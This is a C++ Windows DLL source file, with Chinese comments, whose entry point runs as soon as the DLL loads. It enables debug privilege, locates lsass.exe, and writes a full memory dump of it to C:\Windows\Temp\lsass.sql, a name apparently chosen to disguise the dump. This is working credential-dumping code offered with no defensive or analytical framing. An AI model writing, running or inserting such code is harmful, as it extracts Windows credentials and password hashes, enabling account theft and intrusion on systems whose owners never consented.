// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#pragma comment( lib, "Dbghelp.lib" )

bool EnableDebugPrivilege()
{
    HANDLE hThis = GetCurrentProcess();
    HANDLE hToken;
    OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, &hToken);
    LUID luid;
    LookupPrivilegeValue(0, TEXT("seDebugPrivilege"), &luid);
    TOKEN_PRIVILEGES priv;
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, false, &priv, sizeof(priv), 0, 0);
    CloseHandle(hToken);
    CloseHandle(hThis);
    return true;
}

void GetErrorMessage() {
    LPVOID lpMsgBuf;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        GetLastError(),
        0, // Default language
        (LPTSTR)&lpMsgBuf,
        0,
        NULL
    );

    MessageBox(NULL, (LPCTSTR)lpMsgBuf, L"Error", MB_OK | MB_ICONINFORMATION);
    // Free the buffer.
    LocalFree(lpMsgBuf);
}

int Dump() {
    EnableDebugPrivilege();
    DWORD lsassPID = 0;
    HANDLE lsassHandle = NULL;
    HANDLE outFile = CreateFile(L"C:\\Windows\\Temp\\lsass.sql", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";
    //遍历lsass.exe 的PID
    if (Process32First(snapshot, &processEntry)) {
        while (_wcsicmp(processName, L"lsass.exe") != 0) {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            lsassPID = processEntry.th32ProcessID;
        }
    }
   
    //调用MiniDumpWriteDump
    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
    if (lsassHandle == NULL)
    {
        GetErrorMessage();
        wprintf(L" OpenProcess Error : %d \n", GetLastError());
    }

    BOOL success = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        wprintf(L"Success!");
        return 0;
    }
    
    CloseHandle(lsassHandle);
    CloseHandle(outFile);
    GetErrorMessage();
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Dump();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

